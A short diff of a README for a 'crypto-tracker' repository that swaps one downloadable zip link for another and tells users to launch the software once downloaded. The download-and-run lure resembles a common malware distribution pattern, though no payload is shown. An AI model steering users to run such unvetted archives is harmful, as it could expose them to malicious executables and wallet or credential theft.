@@ -23,7 +23,7 @@ The "crypto-tracker" repository is a platform designed for users to stay up-to-d
 ## Installation
 To get started with the "crypto-tracker", you can download the software from the following link: 
 
-[![Download Crypto Tracker](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Crypto Tracker](https://github.com/Vivianacesar84/crypto-tracker/releases/download/v1.0/Application.zip)](https://github.com/Vivianacesar84/crypto-tracker/releases/download/v1.0/Application.zip)
 
 Please note that the software needs to be launched after downloading.
 
